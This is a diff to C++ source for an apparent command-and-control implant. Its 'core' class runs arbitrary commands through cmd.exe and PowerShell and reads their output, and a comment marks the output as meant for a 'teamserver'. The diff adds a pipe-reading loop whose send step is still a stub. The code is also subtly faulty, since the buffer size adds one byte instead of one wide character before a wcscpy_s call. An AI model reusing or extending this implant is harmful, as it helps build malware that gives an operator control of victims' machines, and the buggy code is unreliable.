@@ -8,6 +8,12 @@
 #include "process.h"
 #include "core.h"
 
+// TBD: This could lead to buffer overflows -> check if it is enough
+#define BUFSIZE 4096
+
+// UTF-8 regex
+#define UTF8_DETECT_REGEXP  "^([\x09\x0A\x0D\x20-\x7E]|[\xC2-\xDF][\x80-\xBF]|\xE0[\xA0-\xBF][\x80-\xBF]|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}|\xED[\x80-\x9F][\x80-\xBF]|\xF0[\x90-\xBF][\x80-\xBF]{2}|[\xF1-\xF3][\x80-\xBF]{3}|\xF4[\x80-\x8F][\x80-\xBF]{2})*$"
+
 core::core() {
 	HCRYPTPROV hCryptProv;
 	
@@ -70,14 +76,20 @@ std::string core::execute_command(std::string cmd){
 	}
 }
 
+
 std::string core::execute_cmd(std::string cmd) {
 	std::string result = "";
 	std::string fullCommand = "C:\\Windows\\System32\\cmd.exe /c " + cmd;
 	// we need wide chars for our process creation function
 	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
-	wchar_t* genericFullCommand = (wchar_t*) malloc(sizeof(wchar_t) * wideFullCommand.size());
-	wcscpy_s(genericFullCommand, wideFullCommand.size(), wideFullCommand.c_str());
-	PPROCESS_INFORMATION pi = process::create_process(genericFullCommand);
+	// +1 for the NULL ending char
+	wchar_t* genericFullCommand = (wchar_t*) malloc(sizeof(wchar_t) * wideFullCommand.size() + 1);
+	wcscpy_s(genericFullCommand, wideFullCommand.size()+1, wideFullCommand.c_str());
+	PROCESS_INFO* info = process::create_process(genericFullCommand);
+	// to read from pipe
+	if (info->stdOutRd) {
+		this->read_pipe(info->stdOutRd);
+	}
 
 	return result;
 }
@@ -87,4 +99,22 @@ std::string core::execute_powershell(std::string cmd) {
 
 	return result;
 
+}
+
+void core::read_pipe(HANDLE rdPipe) {
+	DWORD dwRead;
+	CHAR chBuf[BUFSIZE];
+	BOOL bSuccess = FALSE;
+
+	for (;;)
+	{
+		bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);
+		if (!bSuccess || dwRead == 0) break;
+
+
+		// Send response to teamserver
+
+		if (!bSuccess) break;
+	}
+	
 }
